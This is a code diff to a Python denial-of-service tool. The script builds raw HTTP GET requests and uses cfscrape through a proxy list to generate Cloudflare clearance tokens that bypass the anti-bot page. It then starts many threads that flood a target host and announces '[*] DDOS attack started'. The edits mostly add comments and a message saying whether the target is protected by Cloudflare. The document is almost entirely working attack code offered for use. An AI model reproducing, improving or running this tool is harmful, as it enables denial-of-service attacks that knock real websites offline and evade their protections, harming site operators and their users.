@@ -1,18 +1,18 @@
 # socket, urllib.request, ssl
-import cfscrape
-import _thread, threading, random
-from inspect import currentframe, getframeinfo
-from usage_commands import usage
+import cfscrape # python module that allows you to bypass cloudflare's anti-bot page 
+import _thread, threading, random 
+from inspect import currentframe, getframeinfo # find the line on program
+from usage_commands import usage 
 from cloudflare_check import cloudflare
 from time import sleep
 from request_default_http import RequestDefaultHTTP
 from request_default_https import RequestDefaultHTTPS
 from request_proxy_http import RequestProxyHTTP
-
+from cloudflare_check import check_cloudflare 
 frame_info = getframeinfo(currentframe())
 
 
-# Creation of http request is cloudflare = False
+# Creation of http request if website is not protected from cloudflare 
 def set_request():
     global request
     get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
@@ -24,7 +24,7 @@ def set_request():
     request_list.append(request)
 
 
-# Creation of http request is cloudflare = True
+# Creation of http request if website is not protected from cloudflare 
 def set_request_cf():
     global request_cf
     global proxy_ip
@@ -43,8 +43,9 @@ def set_request_cf():
 
 
 
+# generate the cf_token to bypass the cloudflare anti-bot 
 def generate_cf_token(i):
-    proxy = proxy_list[i].strip().split(":")  # ['91.93.42.118', '10001']
+    proxy = proxy_list[i].strip().split(":") 
     try:
         proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
         scraper = cfscrape.create_scraper()
@@ -53,7 +54,7 @@ def generate_cf_token(i):
         user_agent_string = "User-Agent: " + user_agent + "\r\n"
         cf_token.append(proxy[0] + "#" + proxy[1] + "#" + cookie_value_string + user_agent_string)
     except:
-        print("Cookies are not generated")
+        print("`cf_token` is not generated")
 
 
 # Reading and writing of data from proxy file in proxy_list array
@@ -72,9 +73,14 @@ def main():
     global go
     global x
     x = 0
-    go = threading.Event()
+    go = threading.Event() 
+
+    output = f"Server {args.host} is protected by cloudflare" if check_cloudflare(url) else f"Server {args.host} is not protected by cloudflare"
+
+
     if cloudflare(url):
-        print("[*] Server ", args.host, " found cloudflare to website ")
+        # print("[*] Server ", args.host, " found cloudflare to website ")
+        print(output)
         for i in range(args.threads):
             _thread.start_new_thread(generate_cf_token, (i,))  # calculate CF token
         sleep(5)
@@ -85,18 +91,19 @@ def main():
             # self, proxy_ip, proxy_port, request_cf, args, counter, go, frame_info
         go.set()
     else:
-        print("[*] Server", args.host, " didn't find cloudflare to website ")
+        # print("[*] Server", args.host, " didn't find cloudflare to website ") 
+        print(output)
         for x in range(args.threads):
-            _thread.start_new_thread(set_request, ())  # Dergo kerkesen, nuk ka nevoje per kalkulime
+            _thread.start_new_thread(set_request, ())  #
         sleep(5)
         print("[*] DDOS attack started")
         for x in range(args.threads):
             request = random.choice(request_list)
             if args.ssl:
-                RequestDefaultHTTP(request, args, x + 1, go, frame_info).start()  # FIXME
+                RequestDefaultHTTP(request, args, x + 1, go, frame_info).start()  
                 # request, args, counter, go ,frame_info
             else:
-                RequestDefaultHTTPS(request, args, x + 1, go, frame_info).start()  # FIXME:
+                RequestDefaultHTTPS(request, args, x + 1, go, frame_info).start()  
                 # request, args, counter, go ,frame_info
         go.set()
 
